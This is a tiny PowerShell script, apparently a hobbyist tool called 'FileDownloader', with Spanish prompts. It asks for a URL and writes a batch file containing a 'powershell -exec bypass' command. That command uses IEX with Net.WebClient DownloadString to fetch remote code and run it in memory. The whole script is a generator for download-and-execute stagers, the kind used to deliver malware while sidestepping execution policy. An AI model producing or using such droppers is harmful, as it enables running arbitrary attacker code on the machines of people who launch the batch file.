Write-Host "FileDownloader v1 - Mrx04programmer" -ForegroundColor Green
$url = Read-Host -Prompt "Link a descargar:"
echo "powershell.exe -exec bypass -c 'IEX (New-Object Net.WebClient).DownloadString($url)" > DownloaderGenerado.bat
